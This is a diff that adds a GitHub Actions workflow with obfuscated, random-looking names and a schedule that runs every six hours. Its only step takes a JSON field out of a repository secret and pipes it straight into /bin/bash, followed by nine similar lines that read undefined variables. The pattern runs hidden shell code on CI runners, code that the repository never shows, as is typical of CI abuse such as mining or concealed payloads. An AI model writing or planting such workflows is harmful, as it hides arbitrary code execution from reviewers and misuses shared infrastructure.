@@ -1,0 +1,27 @@
+name: caidafu2345
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: caidafu2345
+        env:
+          oxne1: ${{ secrets.oxne1 }}
+        run: |
+          echo $oxne1 | jq -r .y21 | /bin/bash
+          echo $ds81 | jq -r .sgdv32174 | /bin/bash
+          echo $blmil62883 | jq -r .fq42870 | /bin/bash
+          echo $cd31962 | jq -r .cx5857 | /bin/bash
+          echo $zx063 | jq -r .adhxb891 | /bin/bash
+          echo $bwepg52086 | jq -r .zqu6685 | /bin/bash
+          echo $t33195 | jq -r .po94 | /bin/bash
+          echo $b02923 | jq -r .x1 | /bin/bash
+          echo $mto43 | jq -r .qg0 | /bin/bash
+          echo $gzx18 | jq -r .evk37 | /bin/bash
+
